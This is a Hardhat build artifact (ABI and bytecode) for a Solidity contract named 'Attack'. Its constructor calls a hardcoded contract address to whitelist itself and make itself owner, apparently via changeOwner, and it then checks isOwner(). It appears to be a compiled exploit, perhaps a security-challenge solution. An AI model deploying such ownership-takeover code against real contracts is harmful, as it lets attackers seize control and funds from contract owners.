{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attack",
  "sourceName": "contracts/Attack.sol",
  "abi": [
    {
      "inputs": [],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "inputs": [],
      "name": "isOwnerCheck",
      "outputs": [
        {
          "internalType": "bool",
          "name": "",
          "type": "bool"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405273d2372eb76c559586be0745914e9538c17878e8126000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555034801561006457600080fd5b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663e43252d7306040518263ffffffff1660e01b81526004016100be919061024c565b600060405180830381600087803b1580156100d857600080fd5b505af11580156100ec573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663a6f9dae1306040518263ffffffff1660e01b8152600401610149919061024c565b600060405180830381600087803b15801561016357600080fd5b505af1158015610177573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166302c6591d306040518263ffffffff1660e01b81526004016101d4919061024c565b600060405180830381600087803b1580156101ee57600080fd5b505af1158015610202573d6000803e3d6000fd5b50505050610267565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102368261020b565b9050919050565b6102468161022b565b82525050565b6000602082019050610261600083018461023d565b92915050565b6101af806102766000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063d51374c114610030575b600080fd5b61003861004e565b6040516100459190610100565b60405180910390f35b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16638f32d59b6040518163ffffffff1660e01b8152600401602060405180830381865afa1580156100bc573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906100e0919061014c565b905090565b60008115159050919050565b6100fa816100e5565b82525050565b600060208201905061011560008301846100f1565b92915050565b600080fd5b610129816100e5565b811461013457600080fd5b50565b60008151905061014681610120565b92915050565b6000602082840312156101625761016161011b565b5b600061017084828501610137565b9150509291505056fea264697066735822122061e9ecfb856840cce772c04c8bef0f84b3ab6ee7e71d24fcb1c449b01c011b2a64736f6c63430008110033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}